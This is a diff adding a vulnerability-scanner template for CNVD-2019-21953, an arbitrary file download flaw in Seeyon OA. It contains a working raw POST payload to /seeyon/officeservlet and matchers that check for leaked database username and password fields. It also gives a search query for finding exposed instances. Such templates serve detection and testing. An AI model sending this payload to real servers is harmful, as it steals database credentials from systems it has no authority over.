@@ -1,0 +1,48 @@
+id: CNVD-2019-21953
+
+info:
+  name: 致远OA-officeservlet-任意文件下载
+  author: capiton
+  severity: high
+  description: 致远OA-officeservlet-任意文件下载CNVD-2019-21953&LOADTEMPLATE漏洞
+  metadata:
+    fofa-query: app="致远互联-OA"
+  tags: 致远互联-OA
+
+requests:
+  - raw:
+      - |-
+        POST /seeyon/officeservlet HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip,deflate
+        Content-Type: text/plain
+
+        DBSTEP V3.0     335             0               0               DBSTEP=OKMLlKlV
+        OPTION=LKDxOWOWLlxwVlOW
+        TEMPLATE=qfuvqfuveRWiyBDUcATRqAOJN1WicElXeAl4Nrg5drMvd1lXN1QQds66
+        COMMAND=BSTLOlMSOCQwOV66
+        affairMemberId=123
+        affairMemberName=123
+        EXTPARAM=zLCiPLVszLwuziwiwLSGwUCuz=66
+        RECORDID=qLwswidTwLdhP4eXwU=Xw4e3ziV6
+        FILENAME=qLwswidTwLdhP4eXwU=Xw4e3ziOCcAw6
+        FILETYPE=qROves66
+        USERNAME=Tu/qTq2O/cRF
+        CREATEDATE=wUgXwB3szB3XzXghw4tGw4tswV66
+        CATEGORY=wV66
+        needReadFile=NrMGyV66
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "ctpDataSource.username="
+          - "ctpDataSource.password="
